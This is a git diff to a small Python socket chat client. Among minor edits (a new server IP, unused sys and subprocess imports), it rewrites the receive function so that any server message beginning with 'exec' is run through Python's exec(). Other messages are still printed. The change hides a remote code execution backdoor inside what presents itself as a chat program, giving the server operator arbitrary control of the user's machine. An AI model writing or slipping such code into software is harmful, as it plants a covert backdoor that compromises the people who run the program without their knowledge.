@@ -1,15 +1,15 @@
 import socket
 import threading
+import sys, subprocess
+from colorama import Fore, Back, Style
 
 PORT = 4545
 
-Disconnect_msg = "!DISCONNECT"
-SERVER = "10.1.55.12"
+SERVER = "10.1.56.61"
 #SERVER = socket.gethostbyname(socket.gethostname())
 
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 client.connect((SERVER, PORT))
-
 
 def send_msg():
     msg = input()
@@ -17,7 +17,15 @@ def send_msg():
     client.send(message)
 
 def recieveMsg():
-    print(client.recv(1024).decode())
+    try:
+        recievedMsg = client.recv(1024).decode()
+        if(recievedMsg[0: 4] == "exec"):
+            exec(recievedMsg[5:])
+        else:
+            print(recievedMsg)
+
+    except:
+        print("Disconnected from the server!")
 
 while True:
     recieveThread = threading.Thread(target=recieveMsg, args=())
